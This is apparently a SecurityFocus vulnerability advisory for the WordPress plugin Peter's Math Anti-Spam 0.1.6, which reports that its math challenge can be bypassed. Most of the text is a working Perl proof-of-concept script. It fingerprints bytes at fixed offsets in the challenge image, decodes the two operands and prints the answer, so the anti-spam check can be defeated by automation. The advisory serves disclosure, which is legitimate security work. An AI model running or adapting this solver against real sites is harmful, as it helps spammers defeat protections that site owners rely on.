source: http://www.securityfocus.com/bid/27287/info

Peter's Math Anti-Spam for WordPress is prone to a security-bypass vulnerability.

This issue occurs when presenting a visitor with challenge data to determine if they are a legitimate user or an automaton. The challenge data is poorly obfuscated and can be interpreted by script code.

Attackers can leverage this issue to bypass the security measures provided by the plugin via an automated script. This could aid in spam distribution and other attacks.

Peter's Math Anti-Spam for WordPress 0.1.6 is vulnerable; other versions may also be affected. 

$ cat math_spam.pl
#!/usr/bin/perl -w

require bytes;

        my $buffer;
        my $number;
        my $op1;
        my $op2;

        my %numberPrints = ("0045", 0,
                            "00c5", 1,
                            "0485", 2,
                            "4309", 3,
                            "0205", 4,
                            "0847", 5,
                            "0601", 6,
                            "0644", 7,
                            "0405", 8,
                            "0031", 9);

        my %numberSizes = ( 0, 4045,
                            1, 3983,
                            2, 4431,
                            3, 4250,
                            4, 4595,
                            5, 5389,
                            6, 4949,
                            7, 4436,
                            8, 4584,
                            9, 5009);

        my $PLUS_SIZE = 7365;
 
        open (INFILE, "<$ARGV[0]");
        binmode(INFILE);
        sysseek(INFILE, 14, 0); #That "0" third argument makes seeking 
absoulte
        sysread(INFILE, $buffer, 2);
        #$number = sprintf("%x%x", map {ord($_)} 
split(//,substr($buffer,0,2)));
        $number = sprintf("%.2x%.2x", map {ord($_)} split(//,$buffer));
        $op1 = $numberPrints{$number};
        sysseek(INFILE, $numberSizes{$op1} + $PLUS_SIZE - 2, 1); #That 
third "1" argument makes seeking relative
        sysread(INFILE, $buffer, 2);
        $number = sprintf("%.2x%.2x", map {ord($_)} split(//,$buffer));
        $op2 = $numberPrints{$number};
        print $op1 . " + " . $op2 . " = " . ($op1+$op2) . "\n";
        close(INFILE);
